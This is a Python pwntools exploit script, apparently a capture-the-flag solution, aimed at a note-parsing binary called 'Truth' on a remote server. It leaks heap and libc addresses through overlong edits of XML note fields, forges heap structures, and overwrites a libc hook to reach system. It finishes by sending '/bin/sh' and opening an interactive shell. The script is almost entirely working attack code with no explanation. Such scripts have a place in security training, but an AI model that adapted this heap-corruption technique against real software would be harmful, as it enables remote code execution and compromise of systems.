from pwn import *

context.log_level="debug"
def parse(note):
   p.sendlineafter(": ","1")
   p.sendlineafter("content\n",note+"\xff")

def edit(name,note):
   p.sendlineafter(": ","2")
   p.sendlineafter("edit\n",name)
   p.sendline(note)  

def show(name):
      p.sendlineafter(": ","4")
      p.sendlineafter("MEME\n",name)
p=remote("106.14.216.214",49893)
#p=process("./Truth")
note='''
<?xml version="1.0" encoding="UTF-8"?>
<note>
  <to>33333333</to>
  <from>4444444</from>
  <heading>55555555</heading>
  <body>66666666</body>
  <body2>66666666</body2>
</note>
'''
parse(note)
edit("to","1"*0x60)
#gdb.attach(p)
edit("to","a"*0x78)

show("to")
p.recvuntil("1"*0x60)
addr=u64(p.recvuntil("\n")[:-1].ljust(8,"\x00"))
print hex(addr)
edit("to","a")
show("to")

p.recvuntil("a"*0x78)
heap_addr=u64(p.recvuntil("\n")[:-1].ljust(8,"\x00"))
print hex(heap_addr)
payload=p64(0x00000000004054e0)+p64(0x0000000100000001)+p64(0x0000000000405340)+p64(heap_addr)+p64(4)+p64(0x00007f006d6f7266)
payload+=p64(heap_addr-0xa188+0x9f35)+p64(0)*3+p64(heap_addr+0x18)*2+p64(0)+p64(heap_addr+0x9cf0-0xa188)
payload+=p64(heap_addr+0x9ce0-0xa188)+p64(0)*2
edit("body","a"*0x200)
edit("to","a"*0x60+payload+p64(heap_addr-0xa188+0xa810))
edit("to","aaaa")
show("from")
p.recvuntil("Useless")
libc_addr=u64(p.recvuntil("\n")[:-1].ljust(8,"\x00"))-0x7ffff7530b78+0x7ffff716c000
print hex(libc_addr)
edit("to","a"*0x60+payload+p64(libc_addr+0x3c67a8))
edit("to","aaa")
edit("from",p64(libc_addr+0x0453a0))
edit("from","aaa")
#edit("from","/bin/sh;"+"a"*0x60)
p.sendlineafter(": ","2")
p.sendlineafter("edit\n","/bin/sh;"+"a"*0x20)
p.interactive()